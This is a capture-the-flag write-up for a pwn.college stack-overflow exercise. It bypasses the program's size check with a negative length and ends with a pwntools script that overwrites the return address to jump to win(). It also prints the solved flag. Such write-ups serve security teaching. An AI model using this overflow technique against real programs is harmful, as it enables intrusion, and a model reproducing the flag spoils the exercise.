# level4.0
## Description
Overflow a buffer and smash the stack to obtain the flag, but this time bypass a check designed to prevent you from doing so!
## Solution
- Running `./babymem-level-4-0` we get the following output:
```
###
### Welcome to ./babymem-level-4-0!
###

The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffedc4c5eb0 (rsp+0x0000) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007ffedc4c5eb8 (rsp+0x0008) | 78 70 4c dc fe 7f 00 00 | 0x00007ffedc4c7078 |
| 0x00007ffedc4c5ec0 (rsp+0x0010) | 68 70 4c dc fe 7f 00 00 | 0x00007ffedc4c7068 |
| 0x00007ffedc4c5ec8 (rsp+0x0018) | 0a 00 00 00 01 00 00 00 | 0x000000010000000a |
| 0x00007ffedc4c5ed0 (rsp+0x0020) | a0 e6 00 a9 47 79 00 00 | 0x00007947a900e6a0 |
| 0x00007ffedc4c5ed8 (rsp+0x0028) | 20 60 40 00 00 00 00 00 | 0x0000000000406020 |
| 0x00007ffedc4c5ee0 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffedc4c5ee8 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffedc4c5ef0 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffedc4c5ef8 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffedc4c5f00 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffedc4c5f08 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffedc4c5f10 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffedc4c5f18 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffedc4c5f20 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffedc4c5f28 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffedc4c5f30 (rsp+0x0080) | 70 6f 4c dc fe 7f 00 00 | 0x00007ffedc4c6f70 |
| 0x00007ffedc4c5f38 (rsp+0x0088) | e0 5e 4c dc fe 7f 00 00 | 0x00007ffedc4c5ee0 |
| 0x00007ffedc4c5f40 (rsp+0x0090) | 70 6f 4c dc fe 7f 00 00 | 0x00007ffedc4c6f70 |
| 0x00007ffedc4c5f48 (rsp+0x0098) | 57 22 40 00 00 00 00 00 | 0x0000000000402257 |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffedc4c5eb0, and our base pointer points to 0x7ffedc4c5f40.
This means that we have (decimal) 20 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 160 bytes.
The input buffer begins at 0x7ffedc4c5ee0, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 75 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is no "win" variable.
You will need to force the program to execute the win() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7ffedc4c5f48, 104 bytes after the start of your input buffer.
That means that you will need to input at least 112 bytes (75 to fill the buffer,
29 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

We have disabled the following standard memory corruption mitigations for this challenge:
- the canary is disabled, otherwise you would corrupt it before
overwriting the return address, and the program would abort.
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

Payload size: 
```
- The program tells us that we need to input at least 112 bytes to overwrite the return address.
- Entering payload size as 112:
```
Payload size: 112
This challenge is more careful: it will check to make sure you
don't want to provide so much data that the input buffer will
overflow. But recall twos compliment, look at how the check is
implemented, and try to beat it!
Provided size is too large!
```
- The program tells us that the provided size is too large. We need to bypass this check.
- We're given a hint which mentions two's complement. This is a hint that we can bypass the check by providing a negative value.
- Entering payload size as -1:
```
Payload size: -1
This challenge is more careful: it will check to make sure you
don't want to provide so much data that the input buffer will
overflow. But recall twos compliment, look at how the check is
implemented, and try to beat it!
You made it past the check! Because the read() call will interpret
your size differently than the check above, the resulting read will
be unstable and might fail. You will likely have to try this several
times before your input is actually read.
You have chosen to send -1 bytes of input!
This will allow you to write from 0x7ffd2a636ac0 (the start of the input buffer)
right up to (but not including) 0x7ffd2a636abf (which is -76 bytes beyond the end of the buffer).
Of these, you will overwrite -105 bytes into the return address.
If that number is greater than 8, you will overwrite the entire return address.

You will want to overwrite the return value from challenge()
(located at 0x7ffd2a636b28, 104 bytes past the start of the input buffer)
with 0x401aaa, which is the address of the win() function.
This will cause challenge() to return directly into the win() function,
which will in turn give you the flag.
Keep in mind that you will need to write the address of the win() function
in little-endian (bytes backwards) so that it is interpreted properly.

Send your payload (up to -1 bytes)!
```
- We need to overwrite the return address with the address of the win() function which is `0x401aaa`.
- Wrote the following python script to get the flag:
```python
import pwn

padding = b'A' * 104
payload = padding + pwn.p64(0x401aaa)

r = pwn.process('/challenge/babymem-level-4-0')
r.recvuntil('size:')
r.sendline('-1')

r.recvuntil('bytes)!')
r.send(payload)
print(r.readall())
```
- Running the script we get the flag: `pwn.college{8PM2zLkCtmZ9nwR83LqCAnBxQ6R.0VN5IDL5QTO0czW}`.